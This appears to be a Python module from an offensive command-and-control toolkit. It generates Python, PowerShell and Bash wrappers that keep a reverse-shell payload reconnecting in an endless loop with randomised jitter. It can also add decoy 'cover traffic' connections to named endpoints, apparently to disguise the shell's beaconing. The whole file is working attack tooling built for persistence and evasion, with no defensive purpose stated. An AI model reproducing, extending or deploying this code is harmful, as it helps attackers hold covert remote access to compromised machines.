#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""TCP reverse-shell resilience: reconnect jitter and optional cover traffic."""

from __future__ import annotations

from typing import Iterable, List

from lib.c2.beacon_timing import jitter_seconds


def parse_cover_endpoints(raw: str) -> List[tuple[str, int]]:
    endpoints: List[tuple[str, int]] = []
    for item in str(raw or "").split(","):
        item = item.strip()
        if not item:
            continue
        if ":" in item:
            host, port = item.rsplit(":", 1)
            try:
                endpoints.append((host.strip(), int(port.strip())))
            except ValueError:
                continue
        else:
            endpoints.append((item, 443))
    return endpoints


def build_python_cover_traffic_block(endpoints: Iterable[tuple[str, int]]) -> str:
    eps = list(endpoints)
    if not eps:
        return ""
    lines = ["import socket as _ks_socket", "_ks_cover_eps = ["]
    for host, port in eps:
        lines.append(f"    ({host!r}, {port}),")
    lines.append("]")
    lines.extend([
        "for _ks_h, _ks_p in _ks_cover_eps:",
        "    try:",
        "        _ks_s = _ks_socket.socket(_ks_socket.AF_INET, _ks_socket.SOCK_STREAM)",
        "        _ks_s.settimeout(2)",
        "        _ks_s.connect((_ks_h, _ks_p))",
        "        _ks_s.close()",
        "    except Exception:",
        "        pass",
    ])
    return "\n".join(lines) + "\n"


def build_python_reconnect_wrapper(
    body: str,
    *,
    reconnect_interval: float = 15.0,
    jitter_percent: float = 35.0,
    cover_endpoints: Iterable[tuple[str, int]] = (),
) -> str:
    """Wrap a Python script body with reconnect loop (re-runs body after disconnect)."""
    cover = build_python_cover_traffic_block(cover_endpoints)
    indented = "\n".join(("        " + line) if line.strip() else "" for line in body.splitlines())
    return (
        "import random,time,socket\n"
        + cover
        + f"_ks_base={float(reconnect_interval)}\n"
        + f"_ks_jitter={float(jitter_percent)}\n"
        + "def _ks_delay():\n"
        + "    spread=max(0.0,_ks_base*(_ks_jitter/100.0))\n"
        + "    time.sleep(max(0.5,_ks_base+random.uniform(-spread,spread)))\n"
        + "while True:\n"
        + "    try:\n"
        + indented
        + "\n    except Exception:\n"
        + "        _ks_delay()\n"
    )


def build_powershell_cover_traffic_block(endpoints: Iterable[tuple[str, int]]) -> str:
    eps = list(endpoints)
    if not eps:
        return ""
    chunks = []
    for host, port in eps:
        chunks.append(
            f"try{{$cs=New-Object Net.Sockets.TcpClient('{host}',{int(port)});$cs.Close()}}catch{{}}"
        )
    return "".join(chunks)


def build_powershell_reconnect_wrapper(
    body: str,
    *,
    reconnect_interval: float = 15.0,
    jitter_percent: float = 35.0,
    cover_endpoints: Iterable[tuple[str, int]] = (),
) -> str:
    cover = build_powershell_cover_traffic_block(cover_endpoints)
    spread = max(0.0, float(reconnect_interval) * (float(jitter_percent) / 100.0))
    low = max(0.5, float(reconnect_interval) - spread)
    high = max(low, float(reconnect_interval) + spread)
    return (
        f"$ksBase={float(reconnect_interval)};"
        f"$ksLow={low};$ksHigh={high};"
        "function ksDelay{Start-Sleep -Seconds (Get-Random -Minimum $ksLow -Maximum $ksHigh)}"
        f"while($true){{try{{{cover}{body};break}}catch{{ksDelay}}}}"
    )


def build_bash_reconnect_wrapper(
    payload: str,
    *,
    reconnect_interval: float = 15.0,
    jitter_percent: float = 35.0,
) -> str:
    spread = max(1, int(float(reconnect_interval) * (float(jitter_percent) / 100.0)))
    base = max(1, int(float(reconnect_interval)))
    return (
        f"while true; do {payload}; "
        f"sleep $(( {base} + (RANDOM % {spread}) )); done"
    )


def sample_reconnect_delay(base: float, jitter_percent: float) -> float:
    """Helper for listeners/logging — next reconnect delay estimate."""
    return jitter_seconds(base, jitter_percent)
